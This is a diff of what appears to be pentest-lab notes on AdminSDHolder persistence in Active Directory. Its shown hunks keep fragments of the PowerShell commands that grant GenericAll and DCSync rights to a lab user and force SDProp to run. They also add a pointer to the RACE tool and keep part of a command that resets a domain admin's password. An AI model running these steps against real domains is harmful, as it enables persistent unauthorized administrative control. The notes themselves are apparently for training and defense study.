@@ -1,21 +1,15 @@
 # AdminSDHolder
 
 AdminSDHolder is a system container that used to control permissions.\
-These permissions are used as a template for protected accounts to prevent modifications to them. \
+These permissions are used as a template for protected accounts to prevent modifications to them. \\
 
-
-Security Descriptor Propagator (SDPROP) runs every 60 minutes.\
-SDPROP compares between the ACL of the protected groups and members and the ACL of AdminSDHolder, then any differences are overwritten on the ACL Object.
+**Security Descriptor Propagator** (SDPROP) runs every 60 minutes.\
+SDPROP compares between the ACL of the protected groups and members and the ACL of **AdminSDHolder**, then any differences are overwritten on the ACL Object.
 
 ## Exploitation
 
 An attacker can utilize SDROP mechinsem by adding a user with GenericAll privileges\
-to theAdminSD Holder object.\
-\
-When the SDPROP runs (every 60 minutes) the user will be add with elevated privileges.\
-
-
-Adding user to the AdminSDHolder object&#x20;
+to theAdminSD Holder object. When the SDPROP runs (every 60 minutes) the user will be add with elevated privileges. Adding user to the AdminSDHolder object.
 
 {% code overflow="wrap" %}
 ```powershell
@@ -39,7 +33,9 @@ al' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.money
 ```
 {% endcode %}
 
-Run SDProp mannually
+Use tool called [RACE ](https://github.com/samratashok/RACE)to add the privileges easily through commandline.
+
+Run SDProp mannually. If GUI access is availabe, the above privileges can be added easily through GUI.
 
 ```powershell
 Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
@@ -71,4 +67,3 @@ Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Pas
 ```
 {% endtab %}
 {% endtabs %}
-
